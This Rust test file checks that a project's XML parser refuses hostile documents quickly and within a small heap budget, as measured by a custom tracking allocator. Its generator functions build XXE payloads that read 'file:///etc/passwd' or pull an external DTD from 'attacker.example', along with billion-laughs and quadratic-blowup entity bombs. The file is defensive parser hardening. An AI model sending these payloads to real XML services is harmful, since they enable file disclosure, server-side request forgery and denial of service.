//! The hostile XML sample set (US-RR-27-7, SECURITY.md *API Security*,
//! EC-09): every file of `tests/data/xml/hostile/` is refused by
//! `rr_defs::xml::parse` with its expected code at its expected `line:col`,
//! with no document, quickly, and with a small, bounded peak of heap.
//!
//! The committed files are the attacks real XML parsers have fallen to:
//! billion laughs (`lol1`..`lol9`), the quadratic blowup, XXE through a
//! general entity (SYSTEM and PUBLIC), through a parameter entity and
//! through out-of-band exfiltration, entities left to an external DTD
//! (which is never fetched), deep nesting, many and duplicate attributes,
//! entities HTML knows and XML does not, bad character references, and
//! UTF-16/UTF-32 and encodings that lie about themselves. Each is under
//! 64 KiB, the size `xtask/tests/fuzz.rs` allows a fuzz regression input;
//! the same bytes are `fuzz/regressions/xml/` (kept identical by the fuzz
//! crate's `xml_regressions_are_the_hostile_set` test), so `cargo xtask fuzz
//! replay` runs them through the fuzz target on stable too.
//!
//! The attacks that need a big file (an attribute value over 64 KiB, a
//! million levels, a million attributes, a file over 64 MiB) are generated
//! here at test time instead of committed. Each hostile class is also
//! generated at two sizes, at least ten times apart, to show the cost of
//! refusing it is set by the input and not by what it asks for: the same
//! diagnostic, the same peak heap, and time no worse than linear in the
//! input. ISO-8859-1, the one encoding the reader copies, is checked to cost
//! that copy and no more.
//!
//! A dedicated test binary, because it replaces the global allocator with
//! one that tracks the live heap per thread (the pattern of
//! `rr-core/tests/expr_eval_no_alloc.rs`): the peak is what the read itself
//! held at once, not what other threads of the test process did meanwhile.
//! The counters are test-only and listed in `xtask/globals-allowlist.toml`.

use std::alloc::{GlobalAlloc, Layout, System};
use std::cell::Cell;
use std::path::{Path, PathBuf};
use std::time::{Duration, Instant};

use rr_core::diag::{Code, Severity, codes};
use rr_defs::xml;

// --- Peak-heap tracking --------------------------------------------------------

/// Forwards to [`System`], tracking the calling thread's live heap.
struct Tracking;

thread_local! {
    /// Bytes allocated and not yet freed by this thread (wrapping: memory
    /// freed here that another thread allocated counts negative).
    static LIVE: Cell<usize> = const { Cell::new(0) };
    /// The highest `LIVE` since the last [`peak_in`] window started.
    static PEAK: Cell<usize> = const { Cell::new(0) };
}

/// Must not allocate (it runs inside the allocator); `try_with` so a call
/// during thread teardown is skipped rather than a panic.
fn grow(bytes: usize) {
    let _ = LIVE.try_with(|live| {
        let now = live.get().wrapping_add(bytes);
        live.set(now);
        let _ = PEAK.try_with(|peak| {
            if now.wrapping_sub(peak.get()) < usize::MAX / 2 {
                peak.set(now);
            }
        });
    });
}

fn shrink(bytes: usize) {
    let _ = LIVE.try_with(|live| live.set(live.get().wrapping_sub(bytes)));
}

#[global_allocator]
static GLOBAL: Tracking = Tracking;

// SAFETY: every method forwards to `System` with the caller's arguments
// unchanged; the tracking does not affect what is returned.
unsafe impl GlobalAlloc for Tracking {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        grow(layout.size());
        // SAFETY: forwarded unchanged; the caller upholds `alloc`'s contract.
        unsafe { System.alloc(layout) }
    }

    unsafe fn alloc_zeroed(&self, layout: Layout) -> *mut u8 {
        grow(layout.size());
        // SAFETY: forwarded unchanged; the caller upholds the contract.
        unsafe { System.alloc_zeroed(layout) }
    }

    unsafe fn realloc(&self, ptr: *mut u8, layout: Layout, new_size: usize) -> *mut u8 {
        // Counted as a new block before the old one is freed: the moment
        // both exist is the peak.
        grow(new_size);
        shrink(layout.size());
        // SAFETY: forwarded unchanged; `ptr` came from this allocator.
        unsafe { System.realloc(ptr, layout, new_size) }
    }

    unsafe fn dealloc(&self, ptr: *mut u8, layout: Layout) {
        shrink(layout.size());
        // SAFETY: forwarded unchanged; `ptr` came from this allocator.
        unsafe { System.dealloc(ptr, layout) };
    }
}

/// Runs `f` and returns its result, how long it took, and the most heap it
/// held at once over what was live when it started (on this thread).
#[expect(
    clippy::disallowed_methods,
    reason = "test only: the time bound on refusing a hostile file is real time"
)]
fn measured<T>(f: impl FnOnce() -> T) -> (T, Duration, usize) {
    let start = LIVE.with(Cell::get);
    PEAK.with(|p| p.set(start));
    let t = Instant::now();
    let out = f();
    let elapsed = t.elapsed();
    let peak = PEAK.with(Cell::get).wrapping_sub(start);
    (out, elapsed, peak)
}

// --- The sample set ------------------------------------------------------------

/// Every committed sample: file name, expected code, expected `line:col`.
const SAMPLES: &[(&str, Code, &str)] = &[
    ("billion-laughs.xml", codes::XML_ENTITY_DECLARED, "3:3"),
    ("quadratic-blowup.xml", codes::XML_ENTITY_DECLARED, "3:3"),
    ("xxe-system-file.xml", codes::XML_ENTITY_DECLARED, "3:3"),
    ("xxe-public-url.xml", codes::XML_ENTITY_DECLARED, "3:3"),
    (
        "xxe-parameter-entity.xml",
        codes::XML_ENTITY_DECLARED,
        "3:3",
    ),
    (
        "xxe-parameter-reference.xml",
        codes::XML_ENTITY_DECLARED,
        "4:3",
    ),
    (
        "xxe-oob-exfiltration.xml",
        codes::XML_ENTITY_DECLARED,
        "3:3",
    ),
    ("external-dtd-entity.xml", codes::XML_UNKNOWN_ENTITY, "4:8"),
    (
        "external-dtd-entity-in-attribute.xml",
        codes::XML_UNKNOWN_ENTITY,
        "4:14",
    ),
    ("unknown-entity.xml", codes::XML_UNKNOWN_ENTITY, "4:23"),
    (
        "unknown-entity-in-text.xml",
        codes::XML_UNKNOWN_ENTITY,
        "3:11",
    ),
    ("deep-nesting.xml", codes::XML_TOO_DEEP, "1:193"),
    ("deep-nesting-closed.xml", codes::XML_TOO_DEEP, "3:190"),
    (
        "many-attributes.xml",
        codes::XML_TOO_MANY_ATTRIBUTES,
        "3:564",
    ),
    ("duplicate-attribute.xml", codes::XML_MALFORMED, "3:17"),
    ("invalid-char-ref.xml", codes::XML_MALFORMED, "3:8"),
    ("surrogate-char-ref.xml", codes::XML_MALFORMED, "3:8"),
    ("utf16le-bom.xml", codes::XML_ENCODING, "1:1"),
    ("utf16be-bom.xml", codes::XML_ENCODING, "1:1"),
    ("utf16le-no-bom.xml", codes::XML_ENCODING, "1:1"),
    ("utf32le-bom.xml", codes::XML_ENCODING, "1:1"),
    ("encoding-lie-utf16.xml", codes::XML_ENCODING, "1:31"),
    ("encoding-lie-utf8.xml", codes::XML_ENCODING, "3:19"),
    ("encoding-lie-ascii.xml", codes::XML_ENCODING, "3:8"),
    ("encoding-unsupported.xml", codes::XML_ENCODING, "1:31"),
    ("invalid-utf8.xml", codes::XML_ENCODING, "2:8"),
];

/// Each committed sample is refused within this long (a debug build; a
/// release build takes microseconds).
const TIME_LIMIT: Duration = Duration::from_secs(1);

/// A generated attack over 64 KiB is refused within this long. Refusing
/// one may scan its input once (a debug build reads a 10 MiB start tag in
/// about 0.4 s), so this is only a guard against a hang, generous enough
/// for a slow Windows debug runner; that the time is bounded by the input
/// and not by what it asks for is
/// [`refusal_cost_does_not_grow_with_the_payload`]'s check.
const HANG_GUARD: Duration = Duration::from_secs(20);

/// The most heap one refusal may hold at once, whatever the input's size:
/// the reader borrows UTF-8 input and stops at the first error, so what it
/// holds is the open elements (at most the depth limit), the DOCTYPE scan
/// and the diagnostic. About 10 KiB is measured at the worst (the 64
/// elements open when deep nesting is refused).
const HEAP_LIMIT: usize = 64 << 10;

fn dir() -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/data/xml/hostile")
}

/// What reading `input` came to: the one diagnostic's code and `line:col`,
/// or a description of how it differs from one refusal.
fn outcome(name: &str, input: &[u8]) -> Result<(Code, String), String> {
    let loaded = xml::parse(name, input);
    let diags = loaded.diagnostics();
    let [d] = diags else {
        return Err(format!("{} diagnostics: {diags:#?}", diags.len()));
    };
    if d.severity() != Severity::Error {
        return Err(format!("not an error: {d}"));
    }
    if loaded.value().is_some() || loaded.clone().accept_errors().0.is_some() {
        return Err("a document came back".to_owned());
    }
    let at = d.provenance().span().to_string();
    Ok((d.code(), at.trim_start_matches(':').to_owned()))
}

#[test]
fn every_hostile_sample_is_refused_quickly_with_little_memory() {
    let mut problems = Vec::new();
    for &(name, code, at) in SAMPLES {
        let path = dir().join(name);
        let input = std::fs::read(&path).unwrap_or_else(|e| panic!("{}: {e}", path.display()));
        assert!(input.len() <= 64 << 10, "{name} is over 64 KiB");
        let (got, elapsed, peak) = measured(|| outcome(name, &input));
        match got {
            Ok((c, a)) if c == code && a == at => {}
            Ok((c, a)) => problems.push(format!("{name}: {c} at {a}, expected {code} at {at}")),
            Err(e) => problems.push(format!("{name}: {e}")),
        }
        if elapsed > TIME_LIMIT {
            problems.push(format!("{name}: took {elapsed:?}"));
        }
        if peak > HEAP_LIMIT {
            problems.push(format!(
                "{name}: peak heap {peak} bytes for {} input bytes",
                input.len()
            ));
        }
    }
    assert!(problems.is_empty(), "{}", problems.join("\n"));
}

#[test]
fn the_sample_directory_holds_exactly_the_listed_samples() {
    let mut found: Vec<String> = std::fs::read_dir(dir())
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .filter(|n| n != ".gitattributes")
        .collect();
    found.sort();
    let mut listed: Vec<String> = SAMPLES.iter().map(|s| s.0.to_owned()).collect();
    listed.sort();
    assert_eq!(found, listed);
}

/// The attacks that need more than 64 KiB, generated: each is refused
/// before the work it would cost, so the heap it holds does not grow with
/// it (the time is one scan of the input at most).
#[test]
fn oversized_attacks_are_refused_without_reading_them_in() {
    let deep = "<a>".repeat(1_000_000);
    let huge_value = format!("<roms a=\"{}\"/>", "x".repeat(16 << 20));
    let huge_name = format!("<{}/>", "n".repeat(1 << 20));
    let attrs = format!(
        "<roms {}/>",
        (0..1_000_000)
            .map(|i| format!("a{i}=\"\""))
            .collect::<Vec<_>>()
            .join(" ")
    );
    let too_large = vec![b' '; (64 << 20) + 1];
    let cases: [(&str, &[u8], Code, &str); 5] = [
        ("deep", deep.as_bytes(), codes::XML_TOO_DEEP, "1:193"),
        (
            "huge attribute value",
            huge_value.as_bytes(),
            codes::XML_VALUE_TOO_LONG,
            "1:10",
        ),
        (
            "huge element name",
            huge_name.as_bytes(),
            codes::XML_VALUE_TOO_LONG,
            "1:2",
        ),
        (
            "a million attributes",
            attrs.as_bytes(),
            codes::XML_TOO_MANY_ATTRIBUTES,
            "1:445",
        ),
        ("over 64 MiB", &too_large, codes::XML_TOO_LARGE, "1:1"),
    ];
    let mut problems = Vec::new();
    for (name, input, code, at) in cases {
        let (got, elapsed, peak) = measured(|| outcome(name, input));
        match got {
            Ok((c, a)) if c == code && a == at => {}
            Ok((c, a)) => problems.push(format!("{name}: {c} at {a}, expected {code} at {at}")),
            Err(e) => problems.push(format!("{name}: {e}")),
        }
        if elapsed > HANG_GUARD {
            problems.push(format!("{name}: took {elapsed:?}"));
        }
        if peak > HEAP_LIMIT {
            problems.push(format!(
                "{name}: peak heap {peak} bytes for {} input bytes",
                input.len()
            ));
        }
    }
    assert!(problems.is_empty(), "{}", problems.join("\n"));
}

// --- Cost against payload size -------------------------------------------------

/// `levels` of billion laughs: `&lolN;` would expand to `3 * 10^N`
/// characters.
fn billion_laughs(levels: usize) -> String {
    let mut s =
        String::from("<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n");
    for i in 1..=levels {
        let prev = if i == 1 {
            "lol".to_owned()
        } else {
            format!("lol{}", i - 1)
        };
        s += &format!(
            "  <!ENTITY lol{i} \"{}\">\n",
            format!("&{prev};").repeat(10)
        );
    }
    s + &format!("]>\n<lolz>&lol{levels};</lolz>\n")
}

/// An `n`-character entity referenced `n` times: `n^2` characters expanded.
fn quadratic_blowup(n: usize) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n<!DOCTYPE kaboom [\n  <!ENTITY a \"{}\">\n]>\n<kaboom>{}</kaboom>\n",
        "a".repeat(n),
        "&a;".repeat(n)
    )
}

/// An external entity read `n` times, in text and in attributes.
fn xxe(kind: &str, n: usize) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n<!DOCTYPE roms [\n  <!ENTITY xxe {kind}>\n]>\n<roms>{}</roms>\n",
        "<rom a=\"&xxe;\">&xxe;</rom>".repeat(n)
    )
}

/// A parameter entity naming a remote DTD, referenced `n` times.
fn xxe_parameter(n: usize) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n<!DOCTYPE roms [\n  <!ENTITY % remote SYSTEM \"http://attacker.example/evil.dtd\">\n{}]>\n<roms/>\n",
        "  %remote;\n".repeat(n)
    )
}

/// An external DTD (never fetched) whose entity is used `n` times.
fn external_dtd_entity(n: usize) -> String {
    format!(
        "<?xml version=\"1.0\"?>\n<!DOCTYPE roms SYSTEM \"http://attacker.example/evil.dtd\">\n<roms>\n  <rom>{}</rom>\n</roms>\n",
        "&evil;".repeat(n)
    )
}

fn attributes(n: usize) -> String {
    format!(
        "<roms {}/>",
        (0..n)
            .map(|i| format!("a{i}=\"\""))
            .collect::<Vec<_>>()
            .join(" ")
    )
}

/// `outcome` of reading `input`, the fastest of three reads (scheduling
/// noise only ever adds time) and the largest peak heap of the three.
fn best_of_three(name: &str, input: &[u8]) -> (Result<(Code, String), String>, Duration, usize) {
    let mut best = Duration::MAX;
    let mut most = 0;
    let mut last = Err(String::new());
    for _ in 0..3 {
        let (got, elapsed, peak) = measured(|| outcome(name, input));
        best = best.min(elapsed);
        most = most.max(peak);
        last = got;
    }
    (last, best, most)
}

/// Bounded means bounded by the input, not by what it asks for: each hostile
/// class is read at a small size and at one at least ten times larger
/// (a million times the expansion, for billion laughs) and must be refused
/// at the same place with the same peak heap (to a few bytes of diagnostic
/// text), in time that grows no faster than the input does.
///
/// The time check is relative and has a large additive allowance, so a slow
/// or busy runner does not trip it; what it catches is a refusal that does
/// the work it refuses (expanding `10^9` laughs, `n^2` blowup characters or
/// a million open elements), which costs orders of magnitude more.
#[test]
fn refusal_cost_does_not_grow_with_the_payload() {
    /// Peak heap the large read may hold over the small one.
    const HEAP_SLACK: usize = 256;
    /// Time the large read may take over a linear share of the small one.
    const TIME_SLACK: Duration = Duration::from_millis(250);
    /// How much slower per input byte the large read may be.
    const PER_BYTE: u32 = 4;
    let pairs: [(&str, String, String); 10] = [
        ("billion laughs", billion_laughs(1), billion_laughs(9)),
        (
            "quadratic blowup",
            quadratic_blowup(100),
            quadratic_blowup(10_000),
        ),
        (
            "XXE SYSTEM",
            xxe("SYSTEM \"file:///etc/passwd\"", 1),
            xxe("SYSTEM \"file:///etc/passwd\"", 100_000),
        ),
        (
            "XXE PUBLIC",
            xxe("PUBLIC \"-//EVIL//X\" \"http://attacker.example/x\"", 1),
            xxe(
                "PUBLIC \"-//EVIL//X\" \"http://attacker.example/x\"",
                100_000,
            ),
        ),
        (
            "XXE parameter entity",
            xxe_parameter(1),
            xxe_parameter(100_000),
        ),
        (
            "external DTD entity",
            external_dtd_entity(1),
            external_dtd_entity(100_000),
        ),
        ("deep nesting", "<a>".repeat(1_000), "<a>".repeat(1_000_000)),
        ("many attributes", attributes(1_000), attributes(1_000_000)),
        (
            "huge attribute value",
            format!("<roms a=\"{}\"/>", "x".repeat(1 << 20)),
            format!("<roms a=\"{}\"/>", "x".repeat(16 << 20)),
        ),
        (
            "huge element name",
            format!("<{}/>", "n".repeat(100 << 10)),
            format!("<{}/>", "n".repeat(1 << 20)),
        ),
    ];
    let mut problems = Vec::new();
    for (name, small, large) in &pairs {
        assert!(
            large.len() >= 5 * small.len(),
            "{name}: the large case is not larger"
        );
        let (small_got, small_time, small_peak) = best_of_three(name, small.as_bytes());
        let (large_got, large_time, large_peak) = best_of_three(name, large.as_bytes());
        match (&small_got, &large_got) {
            (Ok(s), Ok(l)) if s == l && s.0.as_str().starts_with("XML") => {}
            _ => problems.push(format!("{name}: {small_got:?} small, {large_got:?} large")),
        }
        if large_peak > small_peak + HEAP_SLACK || large_peak > HEAP_LIMIT {
            problems.push(format!(
                "{name}: peak heap {small_peak} bytes for {} input bytes, {large_peak} for {}",
                small.len(),
                large.len()
            ));
        }
        let ratio = u32::try_from(large.len().div_ceil(small.len())).unwrap_or(u32::MAX);
        let allowed = small_time
            .saturating_mul(ratio.saturating_mul(PER_BYTE))
            .saturating_add(TIME_SLACK);
        if large_time > allowed || large_time > HANG_GUARD {
            problems.push(format!(
                "{name}: {small_time:?} for {} input bytes, {large_time:?} for {} (allowed {allowed:?})",
                small.len(),
                large.len()
            ));
        }
    }
    assert!(problems.is_empty(), "{}", problems.join("\n"));
}

/// The one input the reader copies is an ISO-8859-1 file, transcoded to
/// UTF-8 before it is read (each byte over 0x7F becomes two). A hostile one
/// costs that copy and no more: at most twice the input plus what a UTF-8
/// refusal holds, and the input is limited to 64 MiB before it is copied.
#[test]
fn a_latin1_hostile_file_costs_one_transcoded_copy_at_most() {
    let latin1 = |body: &str| {
        let mut bytes = b"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n".to_vec();
        // `\u{B0}` is one byte in ISO-8859-1 and two in UTF-8.
        bytes.extend(body.bytes().map(|b| if b == b'~' { 0xB0 } else { b }));
        bytes
    };
    let cases: [(&str, Vec<u8>, Code); 4] = [
        (
            "billion laughs",
            latin1(&billion_laughs(9).replace("<?xml version=\"1.0\"?>\n", "")),
            codes::XML_ENTITY_DECLARED,
        ),
        (
            "deep nesting",
            latin1(&"<a b=\"~\">".repeat(1_000_000)),
            codes::XML_TOO_DEEP,
        ),
        (
            "external DTD entity",
            latin1(&format!(
                "<!DOCTYPE roms SYSTEM \"http://attacker.example/evil.dtd\">\n<roms>~{}</roms>",
                "&evil;~".repeat(100_000)
            )),
            codes::XML_UNKNOWN_ENTITY,
        ),
        (
            "over 64 MiB",
            {
                let mut big = latin1("<roms>");
                big.resize((64 << 20) + 1, 0xB0);
                big
            },
            codes::XML_TOO_LARGE,
        ),
    ];
    let mut problems = Vec::new();
    for (name, input, code) in &cases {
        let (got, _, peak) = measured(|| outcome(name, input));
        match got {
            Ok((c, _)) if c == *code => {}
            other => problems.push(format!("{name}: {other:?}, expected {code}")),
        }
        if peak > 2 * input.len() + HEAP_LIMIT {
            problems.push(format!(
                "{name}: peak heap {peak} bytes for {} input bytes",
                input.len()
            ));
        }
    }
    // Refused before the copy: the length check comes first.
    let (_, _, peak) = measured(|| outcome("over 64 MiB", &cases[3].1));
    if peak > HEAP_LIMIT {
        problems.push(format!("over 64 MiB: copied ({peak} bytes held)"));
    }
    assert!(problems.is_empty(), "{}", problems.join("\n"));
}
